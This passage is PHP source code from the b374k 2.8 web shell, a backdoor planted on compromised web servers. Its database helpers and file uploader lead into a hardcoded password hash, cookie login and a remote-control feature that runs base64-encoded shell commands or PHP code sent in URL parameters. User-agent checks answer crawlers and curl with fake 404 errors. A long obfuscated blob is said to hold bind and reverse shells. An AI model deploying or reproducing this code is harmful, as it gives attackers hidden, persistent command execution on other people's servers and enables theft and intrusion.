        } elseif (function_exists('mssql_field_name')) {
            return mssql_field_name($s_hasil, $s_i);
        }
    } elseif ($s_sqltype == 'pgsql') {
        return pg_field_name($s_hasil, $s_i);
    } elseif ($s_sqltype == 'oracle') {
        return oci_field_name($s_hasil, $s_i + 1);
    } elseif ($s_sqltype == 'sqlite3') {
        return $s_hasil->columnName($s_i);
    } elseif ($s_sqltype == 'sqlite') {
        return sqlite_field_name($s_hasil, $s_i);
    } elseif ($s_sqltype == 'odbc') {
        return odbc_field_name($s_hasil, $s_i + 1);
    } elseif ($s_sqltype == 'pdo') {
        $s_res = $s_hasil->getColumnMeta($s_i);

        return $s_res['name'];
    }
}
function sql_fetch_data($s_sqltype, $s_hasil)
{
    if ($s_sqltype == 'mysql') {
        if (class_exists('mysqli_result')) {
            return $s_hasil->fetch_row();
        } elseif (function_exists('mysql_fetch_row')) {
            return mysql_fetch_row($s_hasil);
        }
    } elseif ($s_sqltype == 'mssql') {
        if (function_exists('sqlsrv_fetch_array')) {
            return sqlsrv_fetch_array($s_hasil, 1);
        } elseif (function_exists('mssql_fetch_row')) {
            return mssql_fetch_row($s_hasil);
        }
    } elseif ($s_sqltype == 'pgsql') {
        return pg_fetch_row($s_hasil);
    } elseif ($s_sqltype == 'oracle') {
        return oci_fetch_row($s_hasil);
    } elseif ($s_sqltype == 'sqlite3') {
        return $s_hasil->fetchArray(1);
    } elseif ($s_sqltype == 'sqlite') {
        return sqlite_fetch_array($s_hasil, 1);
    } elseif ($s_sqltype == 'odbc') {
        return odbc_fetch_array($s_hasil);
    } elseif ($s_sqltype == 'pdo') {
        return $s_hasil->fetch(2);
    }
}
function sql_close($s_sqltype, $s_con)
{
    if ($s_sqltype == 'mysql') {
        if (class_exists('mysqli')) {
            return $s_con->close();
        } elseif (function_exists('mysql_close')) {
            return mysql_close($s_con);
        }
    } elseif ($s_sqltype == 'mssql') {
        if (function_exists('sqlsrv_close')) {
            return sqlsrv_close($s_con);
        } elseif (function_exists('mssql_close')) {
            return mssql_close($s_con);
        }
    } elseif ($s_sqltype == 'pgsql') {
        return pg_close($s_con);
    } elseif ($s_sqltype == 'oracle') {
        return oci_close($s_con);
    } elseif ($s_sqltype == 'sqlite3') {
        return $s_con->close();
    } elseif ($s_sqltype == 'sqlite') {
        return sqlite_close($s_con);
    } elseif ($s_sqltype == 'odbc') {
        return odbc_close($s_con);
    } elseif ($s_sqltype == 'pdo') {
        return $s_con = null;
    }
}
if (!function_exists('str_split')) {
    function str_split($s_t, $s_s = 1)
    {
        $s_a = array();
        for ($s_i = 0; $s_i < strlen($s_t);) {
            $s_a[] = substr($s_t, $s_i, $s_s);
            $s_i += $s_s;
        }

        return $s_a;
    }
}

function rooting()
{
    echo '<b>Sw Bilgi<br><br>' . php_uname() . '<br></b>';
    echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
    echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
    if ($_POST['_upl'] == "Upload") {
        if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
            echo '<b>Yuklendi</b><br><br>';
        } else {
            echo '<b>Basarisiz</b><br><br>';
        }
    }
}

$s_pass = "fb621f5060b9f65acf8eb4232e3024140dea2b34"; // default password : b374k (login and change to new password)

$s_ver = "2.8"; // shell ver
$s_title = "b374k " . $s_ver; // shell title
$s_login_time = 3600 * 24 * 7; // cookie time (login)
$s_debug = false; // debugging mode

@ob_start();
@set_time_limit(0);
@ini_set('html_errors', '0');
@clearstatcache();
define('DS', DIRECTORY_SEPARATOR);

// clean magic quotes
$_POST = clean($_POST);
$_GET = clean($_GET);
$_COOKIE = clean($_COOKIE);
$_GP = array_merge($_POST, $_GET);
$_GP = array_map("ru", $_GP);


if ($s_debug) {
    error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
    @ini_set('display_errors', '1');
    @ini_set('log_errors', '1');
    foreach ($_GP as $k => $v) {
        if (is_array($v)) {
            $v = print_r($v, true);
        }
        echo "<span>" . hss($k . "=>" . $v) . "</span><br />";
    }
} else {
    error_reporting(0);
    @ini_set('display_errors', '0');
    @ini_set('log_errors', '0');
}

$s_auth = false; // login status
if (strlen(trim($s_pass)) > 0) {
    if (isset($_COOKIE['b374k'])) {
        if (strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['b374k']))) {
            $s_auth = true;
        }
    }
    if (isset($_GP['login'])) {
        $s_login = kript($_GP['login']);
        if (strtolower(trim($s_pass)) == $s_login) {
            setcookie("b374k", $s_login, time() + $s_login_time);
            $s_auth = true;
        }
    }
    if (isset($_GP['x']) && ($_GP['x'] == 'logout')) {
        $persist  = array("theme", "cwd");
        $s_reload = (isset($_COOKIE['b374k_included']) && isset($_COOKIE['s_home'])) ? rtrim(urldecode($_COOKIE['s_self']),
            "&") : "";
        foreach ($_COOKIE as $s_k => $s_v) {
            if (!in_array($s_k, $persist)) {
                if (!is_array($s_k)) {
                    setcookie($s_k, "", time() - $s_login_time);
                }
            }
        }
        $s_auth = false;
        if (!empty($s_reload)) {
            header("Location: " . $s_reload);
        }
    }
} else {
    $s_auth = true;
}
// This is a feature where you can control this script from another apps/scripts
// you need to supply password (in sha1(md5()) format) to access this
// this example using password 'b374k' in sha1(md5()) format (s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34)
// give the code/command you want to execute in base64 format
// this example using command 'uname -a' in base64 format (cmd=dW5hbWUgLWE=)
// example:
//		http://www.myserver.com/b374k.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&cmd=dW5hbWUgLWE=
// next sample will evaluate php code 'phpinfo();' in base64 format (eval=cGhwaW5mbygpOw==)
//		http://www.myserver.com/b374k.php?s_pass=fb621f5060b9f65acf8eb4232e3024140dea2b34&eval=cGhwaW5mbygpOw==
// recommended ways is using POST DATA
// note that it will not works if shell password is empty ($s_pass);
// better see code below
if (!empty($_GP['s_pass'])) {
    if (strtolower(trim($s_pass)) == strtolower(trim($_GP['s_pass']))) {
        if (isset($_GP['cmd'])) {
            echo exe(base64_decode($_GP['cmd']));
        } elseif (isset($_GP['eval'])) {
            $s_code = base64_decode($_GP['eval']);
            ob_start();
            eval($s_code);
            $s_res = ob_get_contents();
            ob_end_clean();
            echo $s_res;
        } else {
            echo $s_title;
        }
    }
    die();
}

// block search engine bot
if (isset($_SERVER['HTTP_USER_AGENT']) && (preg_match('/bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww/i',
        $_SERVER['HTTP_USER_AGENT']))
) {
    header("HTTP/1.0 404 Not Found");
    header("Status: 404 Not Found");
    die();
} elseif (!isset($_SERVER['HTTP_USER_AGENT'])) {
    header("HTTP/1.0 404 Not Found");
    header("Status: 404 Not Found");
    die();
}

// resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_js $s_rs_c $s_rs_java $s_rs_java $s_rs_win $s_rs_php this was used with bind and reverse shell
// use gzinflate(base64_decode($the_code)) if you wanna see the real code.. in case you dont trust me ;-P
$s_css = "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